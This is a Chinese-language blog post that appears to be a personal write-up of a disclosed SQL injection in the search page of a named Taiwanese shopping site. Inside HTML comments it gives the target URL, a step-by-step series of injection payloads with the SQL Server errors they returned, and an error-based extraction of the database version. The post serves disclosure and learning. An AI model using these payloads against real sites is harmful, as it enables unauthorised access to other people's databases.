---
title: SQL Injection wowcard Success
description: SQL Injection wowcard Success
last_update:
  date: "2025-08-21T08:00:00+08:00"
---

本文是 https://zeroday.hitcon.org/vulnerability/ZD-2025-01031 的延伸

## 學到的東西

同 [上一篇](./sql-injection-wowisee-success.md#學到的東西)

<!-- ## 前言

- 目標: `https://shop.wowcard.com.tw/wsearch.asp`
- 使用 POST + FormData，不需要煩惱 URL Encode + Decode 的問題 -->

<!-- ## 測試過程

1. `'`

```
Microsoft OLE DB Provider for SQL Server 錯誤 '80040e14'

遺漏字元字串 ') Order By 上刊日期 desc' 後面的引號。

/Scripts/DataList_WOWdetail.js, 行318
```

2. `123'`

```
Microsoft OLE DB Provider for SQL Server 錯誤 '80040e14'

接近 '%' 之處的語法不正確。

/Scripts/DataList_WOWdetail.js, 行318
```

3. `%123'--123`

```
Microsoft OLE DB Provider for SQL Server 錯誤 '80040e14'

接近 '%%123' 之處的語法不正確。

/Scripts/DataList_WOWdetail.js, 行318
```

4. `123'--123`

```
Microsoft OLE DB Provider for SQL Server 錯誤 '80040e14'

接近 '%123' 之處的語法不正確。

/Scripts/DataList_WOWdetail.js, 行318
```

5. `123'))--123`

```
Microsoft OLE DB Provider for SQL Server 錯誤 '80040e14'

接近 ')' 之處的語法不正確。

/Scripts/DataList_WOWdetail.js, 行318
```

6. `123')--123`

```
Microsoft OLE DB Provider for SQL Server 錯誤 '80040e14'

接近 ')' 之處的語法不正確。

/Html_Inc/Search_main_kind.asp, 行18
```

7. `123')'--123`

```
Microsoft OLE DB Provider for SQL Server 錯誤 '80040e14'

接近 '--123%' 之處的語法不正確。

/Scripts/DataList_WOWdetail.js, 行318
```

8. `' OR '1' = '1`

成功搜尋到

9. `' AND '1' = '1`

成功搜尋到 0 筆資料，推測應該是我們還在某個 `'` 或是 `)` 裡面，所以註解沒有生效

10. `' AND 1 = CONVERT(int,@@version) OR '1' = '1`

```
Microsoft OLE DB Provider for SQL Server 錯誤 '80040e07'

將 nvarchar 值 'Microsoft SQL Server 2008 (SP4) - 10.0.6000.29 (X64) Sep 3 2014 04:11:34 Copyright (c) 1988-2008 Microsoft Corporation Enterprise Edition (64-bit) on Windows NT 6.1 <X64> (Build 7601: Service Pack 1) ' 轉換成資料類型 int 時，轉換失敗。

/Scripts/DataList_WOWdetail.js, 行318
```

成功提取到 DB 版本號

```
Microsoft SQL Server 2008 (SP4) - 10.0.6000.29 (X64) Sep 3 2014 04:11:34 Copyright (c) 1988-2008 Microsoft Corporation Enterprise Edition (64-bit) on Windows NT 6.1 <X64> (Build 7601: Service Pack 1)
```

11. 接下來請參考 [ZD-2025-01031](https://zeroday.hitcon.org/vulnerability/ZD-2025-01031) -->
